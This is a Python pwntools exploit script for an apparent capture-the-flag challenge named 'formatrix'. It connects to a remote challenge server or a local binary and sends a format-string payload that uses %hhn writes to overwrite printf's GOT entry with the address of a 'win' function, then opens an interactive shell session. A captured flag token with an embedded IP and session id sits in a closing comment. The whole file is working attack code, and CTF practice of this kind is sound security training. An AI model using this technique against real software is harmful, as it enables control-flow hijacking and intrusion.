#!/usr/bin/env python2.7

from pwn import *

def start():
    global p
    global elf
    prog  = "./formatrix"

    if args.REMOTE:
        ip   = "plsdonthaq.me"
        port = 4002
        p = remote(ip, port)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

    return p

def build_payload(win, target, offset, padding):
    payload = b"A" * padding
    payload += p32(target + 0) + p32(target + 1) + p32(target + 2) + p32(target + 3)
    payload += b"%{}c".format(240 - padding)

    for i in range(4):
        byte = win & 0xff
        win >>= 8
        if (byte == 0):
            payload += b"%{}$hhn".format(offset + i)
        else:
            payload += b"%{}c%{}$hhn%{}c".format(byte, offset + i, 256 - byte)

    return payload

start()

p.sendlineafter("say: ", build_payload(elf.symbols["win"], elf.got["printf"], 3, 0))
p.recvuntil("lol")

p.interactive()
p.close()

# FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNC1mb3JtYXRyaXgiLCJpcCI6IjEwMS4xNjQuMzMuMjE5Iiwic2Vzc2lvbiI6ImEyZjM3ZTFmLTE3NTQtNGY4My1hNjUyLTA1ZTA3NmVkNTIzNiJ9.WmoUQ0LzwufDf_TURKFepHAtL0ULKmHUzA-DAR2eKqc}
